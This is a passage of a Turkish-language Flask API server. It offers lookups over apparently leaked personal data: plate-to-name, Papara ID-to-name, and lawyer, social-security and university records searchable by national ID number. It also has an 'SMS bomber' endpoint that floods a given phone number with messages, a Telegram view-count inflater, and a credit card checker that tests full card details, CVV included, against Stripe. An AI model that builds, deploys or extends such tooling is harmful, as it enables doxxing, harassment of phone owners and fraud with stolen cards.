    ad_soyad = request.args.get('ad_soyad', '').strip().upper()
    dosya = 'plaka.txt'
    
    if not os.path.exists(dosya):
        return jsonify({'durum': 'hata', 'mesaj': 'Veri dosyası bulunamadı'}), 404
    
    if plaka:
        sonuc = []
        with open(dosya, 'r', encoding='utf-8') as f:
            for satir in f:
                satir = satir.strip()
                if not satir:
                    continue
                p = satir.split()
                if len(p) >= 2 and p[-1].upper() == plaka:
                    sonuc.append(' '.join(p[:-1]))
        if sonuc:
            return jsonify({'durum': 'başarılı', 'plaka': plaka, 'kisiler': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{plaka} plakası bulunamadı'}), 404
    
    if ad_soyad:
        sonuc = []
        with open(dosya, 'r', encoding='utf-8') as f:
            for satir in f:
                satir = satir.strip()
                if not satir:
                    continue
                p = satir.split()
                if len(p) >= 2:
                    isim = ' '.join(p[:-1]).upper()
                    if ad_soyad in isim:
                        sonuc.append({'ad_soyad': isim, 'plaka': p[-1]})
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad_soyad} bulunamadı'}), 404
    
    return jsonify({'durum': 'hata', 'mesaj': 'Plaka veya ad_soyad girin'}), 400

# ==================== PAPARA API ====================

@app.route('/papara', methods=['GET'])
def papara_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Papara Sorgulama API - Papara ID ↔ Ad-Soyad Dönüşümü',
        'kullanım': {
            'papara_id_ile': '/papara/api?papara_id=1354693996 → Ad-Soyad',
            'isim_ile': '/papara/api?ad_soyad=MEHMET TEKER → Papara ID'
        }
    })

@app.route('/papara/api', methods=['GET'])
def papara_sorgula():
    papara_id = request.args.get('papara_id', '').strip()
    ad_soyad = request.args.get('ad_soyad', '').strip().upper()
    dosya = 'papara.txt'
    
    if not os.path.exists(dosya):
        return jsonify({'durum': 'hata', 'mesaj': 'Veri dosyası bulunamadı'}), 404
    
    if papara_id:
        with open(dosya, 'r', encoding='utf-8') as f:
            for satir in f:
                satir = satir.strip()
                if not satir:
                    continue
                p = [x.strip() for x in satir.split(',')]
                if len(p) >= 2 and p[0] == papara_id:
                    return jsonify({'durum': 'başarılı', 'papara_id': papara_id, 'ad_soyad': p[1]})
        return jsonify({'durum': 'hata', 'mesaj': f'{papara_id} Papara ID bulunamadı'}), 404
    
    if ad_soyad:
        sonuc = []
        with open(dosya, 'r', encoding='utf-8') as f:
            for satir in f:
                satir = satir.strip()
                if not satir:
                    continue
                p = [x.strip() for x in satir.split(',')]
                if len(p) >= 2 and ad_soyad in p[1].upper():
                    sonuc.append({'ad_soyad': p[1], 'papara_id': p[0]})
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad_soyad} bulunamadı'}), 404
    
    return jsonify({'durum': 'hata', 'mesaj': 'Papara ID veya ad_soyad girin'}), 400

# ==================== SİCİL API ====================

@app.route('/sicil', methods=['GET'])
def sicil_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Sicil Sorgulama API',
        'kullanım': {
            'tc': '/sicil/api?tc=19402658634',
            'ad': '/sicil/api?ad=BERKAY',
            'soyad': '/sicil/api?soyad=GENÇTÜRK'
        }
    })

@app.route('/sicil/api', methods=['GET'])
def sicil_sorgula():
    tc = request.args.get('tc', '').strip()
    ad = request.args.get('ad', '').strip()
    soyad = request.args.get('soyad', '').strip()
    dosya = 'sicil.txt'
    
    if not os.path.exists(dosya):
        return jsonify({'durum': 'hata', 'mesaj': 'Veri dosyası bulunamadı'}), 404
    
    # JSON dosyası olarak oku
    try:
        with open(dosya, 'r', encoding='utf-8') as f:
            icerik = f.read()
            veri = json.loads(icerik)
            
            # Veri array'ini bul
            kayitlar = []
            if isinstance(veri, list):
                for item in veri:
                    if isinstance(item, dict) and 'Veri' in item and item['Veri']:
                        kayitlar.extend(item['Veri'])
                    elif isinstance(item, dict):
                        kayitlar.append(item)
            elif isinstance(veri, dict) and 'Veri' in veri:
                kayitlar = veri['Veri']
            
            if tc:
                for k in kayitlar:
                    if k.get('AVUKAT_TC_KIMLIK_NO', '').strip() == tc:
                        return jsonify(k)
                return jsonify({'durum': 'hata', 'mesaj': f'{tc} TC bulunamadı'}), 404
            
            sonuc = []
            for k in kayitlar:
                if ad and ad.upper() not in k.get('KISI_ADI', '').upper():
                    continue
                if soyad and soyad.upper() not in k.get('KISI_SOYAD', '').upper():
                    continue
                sonuc.append(k)
            
            if sonuc:
                return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
            return jsonify({'durum': 'hata', 'mesaj': 'Kayıt bulunamadı'}), 404
            
    except:
        return jsonify({'durum': 'hata', 'mesaj': 'Dosya okuma hatası'}), 500

# ==================== SGK API ====================

@app.route('/sgk', methods=['GET'])
def sgk_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'SGK Sorgulama API',
        'kullanım': {
            'tc': '/sgk/api?tc=10001337050',
            'ad': '/sgk/api?ad=ULAŞ',
            'soyad': '/sgk/api?soyad=DEMİR',
            'ad_soyad': '/sgk/api?ad=ULAŞ&soyad=DEMİR'
        }
    })

@app.route('/sgk/api', methods=['GET'])
def sgk_sorgula():
    tc = request.args.get('tc', '').strip()
    ad = request.args.get('ad', '').strip()
    soyad = request.args.get('soyad', '').strip()
    dosya = 'sgk.txt'
    
    if not os.path.exists(dosya):
        return jsonify({'durum': 'hata', 'mesaj': 'Veri dosyası bulunamadı'}), 404
    
    if tc:
        with open(dosya, 'r', encoding='utf-8') as f:
            for satir in f:
                satir = satir.strip()
                if not satir:
                    continue
                p = [x.strip() for x in satir.split(',')]
                if len(p) >= 3 and p[0] == tc:
                    return jsonify({'tc': p[0], 'ad': p[1], 'soyad': p[2], 'durum': p[3] if len(p) > 3 else ''})
        return jsonify({'durum': 'hata', 'mesaj': f'{tc} TC bulunamadı'}), 404
    
    sonuc = []
    with open(dosya, 'r', encoding='utf-8') as f:
        for satir in f:
            satir = satir.strip()
            if not satir:
                continue
            p = [x.strip() for x in satir.split(',')]
            if len(p) >= 3:
                if ad and ad.upper() not in p[1].upper():
                    continue
                if soyad and soyad.upper() not in p[2].upper():
                    continue
                sonuc.append({'tc': p[0], 'ad': p[1], 'soyad': p[2], 'durum': p[3] if len(p) > 3 else ''})
    
    if sonuc:
        return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
    return jsonify({'durum': 'hata', 'mesaj': 'Kayıt bulunamadı'}), 404

# ==================== ÜNİVERSİTE API ====================

@app.route('/universite', methods=['GET'])
def universite_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Üniversite Sorgulama API',
        'kullanım': {
            'tc': '/universite/api?tc=98097940397',
            'ad_soyad': '/universite/api?ad_soyad=SİMAY AKSOY',
            'universite': '/universite/api?universite=SÜLEYMAN DEMİREL ÜNİVERSİTESİ'
        }
    })

@app.route('/universite/api', methods=['GET'])
def universite_sorgula():
    tc = request.args.get('tc', '').strip()
    ad_soyad = request.args.get('ad_soyad', '').strip()
    universite = request.args.get('universite', '').strip()
    dosya = 'universite.txt'
    
    if not os.path.exists(dosya):
        return jsonify({'durum': 'hata', 'mesaj': 'Veri dosyası bulunamadı'}), 404
    
    with open(dosya, 'r', encoding='utf-8') as f:
        icerik = f.read()
    
    # Blokları ayır
    bloklar = re.split(r'\n\s*(?=TC:)', icerik)
    kayitlar = []
    
    for blok in bloklar:
        if not blok.strip():
            continue
        
        tc_match = re.search(r'TC:\s*([0-9]+)', blok)
        if not tc_match:
            continue
        
        tc = tc_match.group(1).strip()
        ad_match = re.search(r'AD-SOYAD:\s*([^\n]+)', blok)
        ad_soyad_val = ad_match.group(1).strip() if ad_match else ""
        univ_match = re.search(r'ÜNİVERSİTE:\s*([^\n]+)', blok)
        universite_val = univ_match.group(1).strip() if univ_match else ""
        bolum_match = re.search(r'BÖLÜM:\s*([^\n]+)', blok)
        bolum_val = bolum_match.group(1).strip() if bolum_match else ""
        
        kayitlar.append({
            'tc': tc,
            'ad_soyad': ad_soyad_val,
            'universite': universite_val,
            'bolum': bolum_val
        })
    
    if tc:
        for k in kayitlar:
            if k['tc'] == tc:
                return jsonify(k)
        return jsonify({'durum': 'hata', 'mesaj': f'{tc} TC bulunamadı'}), 404
    
    if ad_soyad:
        sonuc = [k for k in kayitlar if ad_soyad.upper() in k['ad_soyad'].upper()]
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad_soyad} bulunamadı'}), 404
    
    if universite:
        sonuc = [k for k in kayitlar if universite.upper() in k['universite'].upper()]
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{universite} üniversitesinde kayıt bulunamadı'}), 404
    
    return jsonify({'durum': 'hata', 'mesaj': 'Lütfen tc, ad_soyad veya universite girin'}), 400

# ==================== SMS BOMBER API ====================

@app.route('/smsbomber', methods=['GET'])
def smsbomber_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'SMS Bomber API',
        'aciklama': 'Telefon numarasına SMS bombası gönderir',
        'kullanım': {
            'bombala': '/smsbomber/bombala?telefon=5551234567',
            'durum': '/smsbomber/durum?telefon=5551234567'
        },
        'not': 'Telefon numarası 0 olmadan, sadece rakam olarak girilir (örn: 5551234567)'
    })

@app.route('/smsbomber/bombala', methods=['GET'])
def smsbomber_bombala():
    telefon = request.args.get('telefon', '').strip()
    
    if not telefon:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Telefon numarası giriniz (0 olmadan, örn: 5551234567)',
            'ornek': '/smsbomber/bombala?telefon=5551234567'
        }), 400
    
    telefon = re.sub(r'\D', '', telefon)
    if len(telefon) < 10:
        return jsonify({'durum': 'hata', 'mesaj': 'Geçerli bir telefon numarası giriniz'}), 400
    
    if telefon.startswith('0'):
        telefon = telefon[1:]
    
    if telefon in sms_threads and sms_threads[telefon].is_alive():
        return jsonify({
            'durum': 'uyarı',
            'mesaj': 'Bu numara zaten bombalanıyor!',
            'telefon': telefon,
            'durum_kontrol': f'/smsbomber/durum?telefon={telefon}'
        })
    
    try:
        def bomba_gonder():
            sms = SendSms(telefon)
            sonuc = sms.run_all()
            sms_results[telefon] = {
                'tarih': datetime.now().isoformat(),
                'telefon': telefon,
                'toplam_servis': sonuc['total'],
                'basari': sonuc['success'],
                'basarisiz': sonuc['failed'],
                'detay': sonuc['results']
            }
        
        thread = threading.Thread(target=bomba_gonder)
        thread.daemon = True
        thread.start()
        sms_threads[telefon] = thread
        
        return jsonify({
            'durum': 'başarılı',
            'mesaj': 'SMS bombası başlatıldı!',
            'telefon': telefon,
            'durum_kontrol': f'/smsbomber/durum?telefon={telefon}'
        })
    except Exception as e:
        return jsonify({'durum': 'hata', 'mesaj': f'Başlatma hatası: {str(e)}'}), 500

@app.route('/smsbomber/durum', methods=['GET'])
def smsbomber_durum():
    telefon = request.args.get('telefon', '').strip()
    
    if not telefon:
        return jsonify({'durum': 'hata', 'mesaj': 'Telefon numarası giriniz'}), 400
    
    telefon = re.sub(r'\D', '', telefon)
    if telefon.startswith('0'):
        telefon = telefon[1:]
    
    if telefon in sms_results:
        return jsonify({
            'durum': 'başarılı',
            'telefon': telefon,
            'sonuc': sms_results[telefon]
        })
    elif telefon in sms_threads and sms_threads[telefon].is_alive():
        return jsonify({
            'durum': 'devam_ediyor',
            'mesaj': 'SMS bombası devam ediyor...',
            'telefon': telefon
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Bu numara için bomba kaydı bulunamadı',
            'telefon': telefon
        }), 404

@app.route('/smsbomber/liste', methods=['GET'])
def smsbomber_liste():
    return jsonify({
        'durum': 'başarılı',
        'toplam': len(sms_results),
        'sonuclar': sms_results
    })

# ==================== TELEGRAM API ====================

@app.route('/telegram', methods=['GET'])
def telegram_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Telegram API - TOKEN GEREKTİRMEZ',
        'aciklama': 'Telegram public API ile bilgi toplama',
        'kullanım': {
            'kullanici_bilgi': '/telegram/user?username=@kullanici_adi',
            'post_analiz': '/telegram/post/analyze?link=https://t.me/username/123',
            'post_goruntulenme': '/telegram/post/view?link=https://t.me/username/123&count=5'
        },
        'not': 'Bu API\'ler Telegram bot token gerektirmez. Sadece public bilgileri çeker.'
    })

@app.route('/telegram/user', methods=['GET'])
def telegram_user_api():
    username = request.args.get('username', '').strip()
    
    if not username:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Kullanıcı adı giriniz (örn: @username)',
            'ornek': '/telegram/user?username=@username'
        }), 400
    
    sonuc = telegram_user_info_public(username)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'kullanici': {
                'username': sonuc.get('username'),
                'display_name': sonuc.get('display_name'),
                'title': sonuc.get('title'),
                'description': sonuc.get('description'),
                'profile_image': sonuc.get('profile_image'),
                'member_count': sonuc.get('member_count'),
                'type': sonuc.get('type'),
                'url': sonuc.get('url')
            }
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Kullanıcı bilgileri alınamadı')
        }), 400

@app.route('/telegram/post/analyze', methods=['GET'])
def telegram_post_analyze_api():
    link = request.args.get('link', '').strip()
    
    if not link:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Telegram mesaj linki giriniz',
            'ornek': '/telegram/post/analyze?link=https://t.me/username/123'
        }), 400
    
    sonuc = telegram_post_analyze(link)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'post': {
                'chat_identifier': sonuc.get('chat_identifier'),
                'message_id': sonuc.get('message_id'),
                'title': sonuc.get('title'),
                'description': sonuc.get('description'),
                'image': sonuc.get('image'),
                'views': sonuc.get('views'),
                'type': sonuc.get('type'),
                'link': sonuc.get('link')
            }
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Post analiz edilemedi')
        }), 400

@app.route('/telegram/post/view', methods=['GET'])
def telegram_post_view_api():
    link = request.args.get('link', '').strip()
    count = request.args.get('count', '1').strip()
    
    if not link:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Telegram mesaj linki giriniz',
            'ornek': '/telegram/post/view?link=https://t.me/username/123&count=5'
        }), 400
    
    try:
        count_int = int(count)
        if count_int < 1:
            count_int = 1
        if count_int > 10:
            count_int = 10
    except:
        count_int = 1
    
    sonuc = telegram_post_view_simulate(link, count_int)
    
    return jsonify({
        'durum': 'başarılı',
        'toplam': sonuc['total'],
        'basari': sonuc['success'],
        'basarisiz': sonuc['failed'],
        'link': sonuc['link'],
        'detay': sonuc['results']
    })

# ==================== CC DOĞRULAMA API ====================

@app.route('/cc', methods=['GET'])
def cc_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Kredi Kartı Doğrulama API',
        'stripe_aktif': bool(STRIPE_SECRET_KEY),
        'kullanım': {
            'luhn': '/cc/luhn?kart=4111111111111111',
            'format_kontrol': '/cc/bilgi (POST)',
            'tam_dogrula': '/cc/dogrula (POST)'
        }
    })

@app.route('/cc/luhn', methods=['GET', 'POST'])
def luhn_kontrol_api():
    if request.method == 'GET':
        kart_no = request.args.get('kart', '').strip()
    else:
        data = request.get_json() or {}
        kart_no = data.get('kart_no', '').strip()
    
    kart_no = re.sub(r'\D', '', kart_no)
    if not kart_no:
        return jsonify({'durum': 'hata', 'mesaj': 'Kart numarası girin'}), 400
    
    return jsonify({
        'durum': 'başarılı',
        'kart_no': kart_no,
        'gecerli': luhn_kontrol(kart_no)
    })

@app.route('/cc/bilgi', methods=['POST'])
def kart_bilgi_kontrol():
    data = request.get_json()
    if not data:
        return jsonify({'durum': 'hata', 'mesaj': 'JSON verisi gönderin'}), 400
    
    kart_no = data.get('kart_no', '').strip()
    ay = data.get('ay', '').strip()
    yil = data.get('yil', '').strip()
    cvv = data.get('cvv', '').strip()
    
    if not all([kart_no, ay, yil, cvv]):
        return jsonify({'durum': 'hata', 'mesaj': 'Tüm alanlar zorunlu'}), 400
    
    kart_no = re.sub(r'\D', '', kart_no)
    hatalar = kart_bilgilerini_kontrol(kart_no, ay, yil, cvv)
    
    if hatalar:
        return jsonify({'durum': 'hata', 'hatalar': hatalar}), 400
    
    return jsonify({
        'durum': 'başarılı',
        'mesaj': 'Format geçerli',
        'kart_no': kart_no[-4:]
    })

@app.route('/cc/dogrula', methods=['POST'])
def cc_dogrula():
    data = request.get_json()
    if not data:
        return jsonify({'durum': 'hata', 'mesaj': 'JSON verisi gönderin'}), 400
    
    kart_no = data.get('kart_no', '').strip()
    ay = data.get('ay', '').strip()
    yil = data.get('yil', '').strip()
    cvv = data.get('cvv', '').strip()
    
    if not all([kart_no, ay, yil, cvv]):
        return jsonify({'durum': 'hata', 'mesaj': 'Tüm alanlar zorunlu'}), 400
    
    kart_no = re.sub(r'\D', '', kart_no)
    hatalar = kart_bilgilerini_kontrol(kart_no, ay, yil, cvv)
    
    if hatalar:
        return jsonify({'durum': 'hata', 'hatalar': hatalar}), 400
    
    if not STRIPE_SECRET_KEY:
        return jsonify({
            'durum': 'başarılı',
            'mesaj': 'Format geçerli (Stripe pasif)',
            'luhn_gecerli': luhn_kontrol(kart_no),
            'kart_no': kart_no[-4:]
        })
    
    try:
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data={
                'type': 'card',
                'card[number]': kart_no,
                'card[exp_month]': ay,
                'card[exp_year]': yil,
                'card[cvc]': cvv
            },
            headers={
                'Authorization': f'Bearer {STRIPE_SECRET_KEY}',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        )
        
        if response.status_code == 200:
            return jsonify({
                'durum': 'başarılı',
                'mesaj': 'Stripe ile doğrulandı',
                'luhn_gecerli': luhn_kontrol(kart_no),
                'kart_no': kart_no[-4:],
                'payment_method_id': response.json().get('id')
            })
        else:
            return jsonify({
                'durum': 'hata',
                'mesaj': response.json().get('error', {}).get('message', 'Stripe hatası')
            }), 400
    except Exception as e:
        return jsonify({'durum': 'hata', 'mesaj': f'Stripe hatası: {str(e)}'}), 500

# ==================== UYGULAMA BAŞLATMA ====================

if __name__ == '__main__':
    print("\n" + "="*50)
    print("🚀 API SUNUCU BAŞLATILIYOR...")
    print("="*50)
    print("📂 Veri dosyaları sorgu anında okunacak (Düşük bellek kullanımı)")
    print("="*50)
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
